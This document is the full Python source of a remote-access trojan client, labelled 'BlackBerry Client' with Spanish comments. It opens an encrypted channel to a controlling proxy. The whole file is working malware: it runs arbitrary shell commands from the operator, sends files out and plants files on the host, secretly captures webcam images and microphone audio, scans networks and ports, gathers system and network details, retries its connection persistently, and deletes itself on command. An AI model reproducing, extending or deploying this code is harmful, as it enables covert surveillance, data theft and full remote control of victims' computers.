#!/usr/bin/env python3
import socket
import ssl
import os
import struct
import time
import subprocess
import hashlib
import sys
import threading
import tempfile
import platform
import getpass
import json
import random
import re
import ipaddress
import queue

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ----------------------------------------------------------------
# Configuración
# ----------------------------------------------------------------
PROXY_HOST = 'localhost'
PROXY_PORT = 9948
TIMEOUT_INACTIVIDAD = 86400  # segundos antes de autodestruir
last_successful_connection = time.time()

RECONNECT_INITIAL_INTERVAL = 5
RECONNECT_MAX_INTERVAL     = 300

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# para serializar envíos concurrentes
send_lock = threading.Lock()

# ----------------------------------------------------------------
# AES-GCM utils
# ----------------------------------------------------------------
def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_encrypted_message(sock, plaintext: str, aes_key: bytes):
    with send_lock:
        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)
        ct = aesgcm.encrypt(nonce, plaintext.encode('utf-8'), None)
        msg = nonce + ct
        sock.sendall(struct.pack('!I', len(msg)) + msg)

def receive_encrypted_message(sock, aes_key: bytes) -> str:
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('!I', raw_len)[0]
    data = recvall(sock, length)
    if not data:
        return None
    nonce, ct = data[:12], data[12:]
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(nonce, ct, None).decode('utf-8')

# ----------------------------------------------------------------
# Banner y ayuda
# ----------------------------------------------------------------
def banner() -> str:
    usr = getpass.getuser()
    so = platform.system()
    version = platform.release()
    host = platform.node()
    machin = platform.machine()
    arct = platform.architecture()
    pythonv = platform.python_version()

    info_usr = f"{usr}@{host}"
    info_so = f"{so} {version}"
    machinc = f"{machin} {arct}"

    lines = [
        "              ,---------------------------,",
        "              |  /---------------------\\  |",
        f"              | | {info_usr:<22.22}| |",
        f"              | | {info_so:<22.22}| |",
        f"              | | {machinc:<22.22}| |",
        "              | |                       | |",
        "              | |                       | |",
        "              |  \\_____________________/  |",
        "              |___________________________|",
        "            ,---\\_____     []     _______/------,",
        "          /         /______________\\           /|",
        "        /___________________________________ /  |",
        "        | BlackBerry Client                 |    )",
        "        |  _ _ _          BlackBerry [ v1.0 ]  |   |",
       f"        |  o o o           Python [{pythonv:<5}]  |  /",
        "        |__________________________________ |/",
        "    /-------------------------------------/|",
        "  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /",
        "/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /",
        "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    ]
    return "\n".join(lines)

HELP_TEXT = (
    "HELP             - Muestra este mensaje.\n"
    "GET_CWD          - Directorio actual.\n"
    "GET_FILE <file>  - Envía archivo al servidor.\n"
    "PUT_FILE <file>  - Recibe archivo del servidor.\n"
    "AUTO-E           - Auto-eliminación.\n"
    "CAPTURE_IMAGE    - Captura imagen (webcam).\n"
    "CAPTURE_AUDIO[n] - Captura audio [segundos].\n"
    "NETINFO          - Muestra info de red.\n"
    "SYSTEM           - Muestra info de sistema.\n"
    "SCAN <args>      - Escaneo de red/puertos.\n"
    "                   scan <ip>/24\n"
    "                   scan <host> <start> <end>\n"
    "                   scan <host>:<port>\n"
    "Otros comandos se ejecutan en shell."
)

# ----------------------------------------------------------------
# Ejecutar comandos y transferencia
# ----------------------------------------------------------------
def execute_command(cmd: str) -> str:
    if cmd.startswith('cd '):
        try:
            os.chdir(cmd[3:].strip())
            return f"[+] Directorio: {os.getcwd()}"
        except Exception as e:
            return f"[-] {e}"
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return (res.stdout or res.stderr).strip() or '[+] Ejecutado.'

def send_file(sock, aes_key, fname):
    if not os.path.isfile(fname):
        return send_encrypted_message(sock, '[-] No encontrado.', aes_key)
    size = os.path.getsize(fname)
    h = hashlib.sha256()
    with open(fname, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            h.update(chunk)
    header = f"SIZE {size} {h.hexdigest()}"
    send_encrypted_message(sock, header, aes_key)
    with open(fname,'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            sock.sendall(chunk)

def receive_file(sock, aes_key, fname):
    hdr = receive_encrypted_message(sock, aes_key)
    if not hdr or not hdr.startswith('SIZE '):
        return '[-] Encabezado inválido.'
    _, sz, expected = hdr.split()
    data = recvall(sock, int(sz))
    if hashlib.sha256(data).hexdigest() != expected:
        return '[-] Hash mismatch.'
    with open(fname, 'wb') as f:
        f.write(data)
    send_encrypted_message(sock, f"[+] Guardado {fname}", aes_key)
    return f"[+] {fname} recibido."

# ----------------------------------------------------------------
# Captura multimedia
# ----------------------------------------------------------------
def capture_image():
    try:
        import cv2
    except ImportError:
        return None, '[-] Instala opencv-python.'
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        cap.release()
        return None, '[-] No cámara.'
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None, '[-] Error captura.'
    path = os.path.join(tempfile.gettempdir(), 'capture.jpg')
    cv2.imwrite(path, frame)
    return path, '[+] Imagen lista.'

def capture_audio(sec=5):
    try:
        import pyaudio, wave
    except ImportError:
        return None, '[-] Instala pyaudio.'
    RATE, CHUNK = 44100, 1024
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=RATE,
                    input=True, frames_per_buffer=CHUNK)
    frames = []
    for _ in range(int(RATE/CHUNK*sec)):
        frames.append(stream.read(CHUNK))
    stream.stop_stream()
    stream.close()
    p.terminate()
    path = os.path.join(tempfile.gettempdir(), 'capture.wav')
    wf = wave.open(path,'wb')
    wf.setnchannels(1)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return path, '[+] Audio listo.'

# ----------------------------------------------------------------
# Scan utilities
# ----------------------------------------------------------------
def scan_ports(host, start, end, timeout=0.3, max_threads=100):
    alive = []
    q = queue.Queue(max_threads)
    def worker(p):
        try:
            s = socket.socket()
            s.settimeout(timeout)
            if s.connect_ex((host, p)) == 0:
                alive.append(p)
        except:
            pass
        finally:
            try: s.close()
            except: pass
            time.sleep(random.uniform(0, 0.02))
            q.get(); q.task_done()

    for port in range(start, end+1):
        q.put(port)
        t = threading.Thread(target=worker, args=(port,))
        t.daemon = True; t.start()
    q.join()
    return sorted(alive)

def scan_network(cidr, timeout=0.3, max_threads=200):
    net = ipaddress.ip_network(cidr, strict=False)
    alive = []
    q = queue.Queue(max_threads)
    def worker(ip):
        try:
            s = socket.socket()
            s.settimeout(timeout)
            if s.connect_ex((str(ip), 80)) == 0:
                alive.append(str(ip))
        except:
            pass
        finally:
            try: s.close()
            except: pass
            time.sleep(random.uniform(0, 0.02))
            q.get(); q.task_done()

    for ip in net.hosts():
        q.put(ip)
        t = threading.Thread(target=worker, args=(ip,))
        t.daemon = True; t.start()
    q.join()
    return alive

# ----------------------------------------------------------------
# Info de red y sistema
# ----------------------------------------------------------------
def get_network_info():
    info = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        info.append(f"IP local: {s.getsockname()[0]}")
        s.close()
    except Exception as e:
        info.append(f"IP local: error ({e})")

    info.append("\nInterfaces:")
    system = platform.system()
    try:
        if system == 'Windows':
            out = subprocess.check_output(['ipconfig', '/all'], text=True, errors='ignore')
            iface = None
            for line in out.splitlines():
                line = line.strip()
                m = re.match(r'^(.+?):$', line)
                if m:
                    iface = m.group(1)
                elif iface and line.startswith('IPv4 Address'):
                    ip = line.split(':')[-1].strip().rstrip('(Preferred)')
                    info.append(f"  • {iface} (inet): {ip}")
                elif iface and line.startswith('IPv6 Address'):
                    ip = line.split(':')[-1].strip().rstrip('(Preferred)')
                    info.append(f"  • {iface} (inet6): {ip}")
                elif iface and line.startswith('Physical Address'):
                    mac = line.split(':')[-1].strip()
                    info.append(f"  • {iface} (mac): {mac}")
        else:
            try:
                out = subprocess.check_output(['ip', '-o', 'addr'], text=True)
                for line in out.splitlines():
                    parts = line.split()
                    ifname, family, addr = parts[1], parts[2], parts[3]
                    info.append(f"  • {ifname} ({family}): {addr}")
            except FileNotFoundError:
                out = subprocess.check_output(['ifconfig'], text=True, errors='ignore')
                iface = None
                for line in out.splitlines():
                    if not line.startswith('\t') and line:
                        iface = line.split()[0]
                    elif iface:
                        m4 = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', line)
                        m6 = re.search(r'inet6 ([0-9a-f:]+)', line)
                        m_mac = re.search(r'(?:ether|HWaddr) ([0-9a-f:]+)', line)
                        if m4:
                            info.append(f"  • {iface} (inet): {m4.group(1)}")
                        if m6:
                            info.append(f"  • {iface} (inet6): {m6.group(1)}")
                        if m_mac:
                            info.append(f"  • {iface} (mac): {m_mac.group(1)}")
    except Exception as e:
        info.append(f"  • Error listando interfaces ({e})")

    info.append("\nPuerta de enlace por defecto:")
    try:
        if system == 'Windows':
            out = subprocess.check_output(['route', 'print', '-4'], text=True, errors='ignore')
            m = re.search(r'0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)\s+(\S+)', out)
        else:
            out = subprocess.check_output(['ip', 'route', 'show', 'default'], text=True)
            m = re.search(r'default via (\S+) dev (\S+)', out)
        if m:
            info.append(f"  • {m.group(1)} vía {m.group(2)}")
        else:
            info.append("  • No encontrada")
    except Exception as e:
        info.append(f"  • Error obteniendo gateway ({e})")

    info.append("\nDNS:")
    try:
        if system == 'Windows':
            out = subprocess.check_output(['ipconfig', '/all'], text=True, errors='ignore')
            for line in out.splitlines():
                if 'DNS Servers' in line:
                    ns = line.split(':')[-1].strip()
                    info.append(f"  • {ns}")
        else:
            with open('/etc/resolv.conf') as f:
                for line in f:
                    if line.startswith('nameserver'):
                        info.append(f"  • {line.split()[1]}")
    except Exception as e:
        info.append(f"  • Error leyendo DNS ({e})")

    info.append("\nIP pública:")
    try:
        with urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3) as resp:
            js = json.load(resp)
            info.append(f"  • {js.get('ip')}")
    except Exception:
        info.append("  • No disponible (sin Internet o bloqueado)")
    return "\n".join(info)

def get_system_info():
    info = {
        'system': platform.system(),
        'node': platform.node(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor()
    }
    return json.dumps(info, ensure_ascii=False)

# ----------------------------------------------------------------
# Conexión principal al proxy con backoff exponencial
# ----------------------------------------------------------------
def connect_to_proxy():
    global last_successful_connection
    backoff = RECONNECT_INITIAL_INTERVAL

    while True:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.connect((PROXY_HOST, PROXY_PORT))
            tls_sock = ssl_context.wrap_socket(raw, server_hostname=PROXY_HOST)
            last_successful_connection = time.time()
            backoff = RECONNECT_INITIAL_INTERVAL

            data = tls_sock.recv(4096)
            if not data.startswith(b'PUBKEY:'):
                tls_sock.close()
                continue
            server_pub = serialization.load_pem_public_key(data[len(b'PUBKEY:'):])

            aes_key = os.urandom(32)
            enc = server_pub.encrypt(
                aes_key,
                padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                             algorithm=hashes.SHA256(),
                             label=None)
            )
            tls_sock.sendall(struct.pack('!I', len(enc)) + enc)

            # Loop principal de comandos
            while True:
                msg = receive_encrypted_message(tls_sock, aes_key)
                if not msg:
                    break
                parts = msg.strip().split()
                cmd = parts[0].upper()

                if cmd == 'HELP':
                    send_encrypted_message(tls_sock, HELP_TEXT, aes_key)

                elif cmd == 'GET_CWD':
                    send_encrypted_message(tls_sock, os.getcwd(), aes_key)

                elif cmd == 'GET_FILE' and len(parts) == 2:
                    send_file(tls_sock, aes_key, parts[1])

                elif cmd == 'PUT_FILE' and len(parts) == 2:
                    receive_file(tls_sock, aes_key, parts[1])

                elif cmd == 'BANNER':
                    send_encrypted_message(tls_sock, banner(), aes_key)

                elif cmd == 'CAPTURE_IMAGE':
                    path, m = capture_image()
                    send_encrypted_message(tls_sock, m, aes_key)
                    if path:
                        send_file(tls_sock, aes_key, path)

                elif cmd == 'CAPTURE_AUDIO':
                    sec = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
                    path, m = capture_audio(sec)
                    send_encrypted_message(tls_sock, m, aes_key)
                    if path:
                        send_file(tls_sock, aes_key, path)

                elif cmd == 'NETINFO':
                    send_encrypted_message(tls_sock, get_network_info(), aes_key)

                elif cmd == 'SYSTEM':
                    send_encrypted_message(tls_sock, get_system_info(), aes_key)

                elif cmd == 'SCAN':
                    # arrancamos el escaneo en background y mostramos progreso
                    finished = threading.Event()
                    results = []

                    def do_scan():
                        nonlocal results
                        if len(parts) == 2 and "/" in parts[1]:
                            results = scan_network(parts[1])
                        elif len(parts) == 4:
                            results = scan_ports(parts[1], int(parts[2]), int(parts[3]))
                        elif len(parts) == 2 and ':' in parts[1]:
                            h, p = parts[1].split(':')
                            openp = scan_ports(h, int(p), int(p))
                            results = [f"abierto"] if openp else [f"cerrado"]
                        else:
                            results = None
                        finished.set()

                    threading.Thread(target=do_scan, daemon=True).start()
                    # barra de carga
                    while not finished.is_set():
                        send_encrypted_message(tls_sock, ".", aes_key)
                        time.sleep(1)
                    # salto de línea final
                    send_encrypted_message(tls_sock, "\n", aes_key)

                    # enviar resultados
                    if results is None:
                        usage = [
                            "Uso: scan <ip>/24",
                            "       scan <host> <start> <end>",
                            "       scan <host>:<port>"
                        ]
                        send_encrypted_message(tls_sock, "\n".join(usage), aes_key)
                    else:
                        if len(parts) == 2 and '/' in parts[1]:
                            header = f"Hosts vivos en {parts[1]}:"
                        elif len(parts) == 4:
                            header = f"Puertos abiertos en {parts[1]} ({parts[2]}-{parts[3]}):"
                        else:
                            header = f"Puerto {parts[1].split(':')[1]} en {parts[1].split(':')[0]}:"
                        lines = [header] + [f"  • {r}" for r in results]
                        send_encrypted_message(tls_sock, "\n".join(lines), aes_key)

                elif cmd == 'AUTO-E':
                    tls_sock.close()
                    os.remove(os.path.abspath(sys.argv[0]))
                    return

                else:
                    res = execute_command(msg)
                    send_encrypted_message(tls_sock, res, aes_key)

        except Exception:
            pass
        finally:
            try:
                tls_sock.close()
            except:
                pass

        wait = backoff + random.uniform(0, backoff * 0.1)
        time.sleep(wait)
        backoff = min(backoff * 2, RECONNECT_MAX_INTERVAL)

if __name__ == '__main__':
    connect_to_proxy()
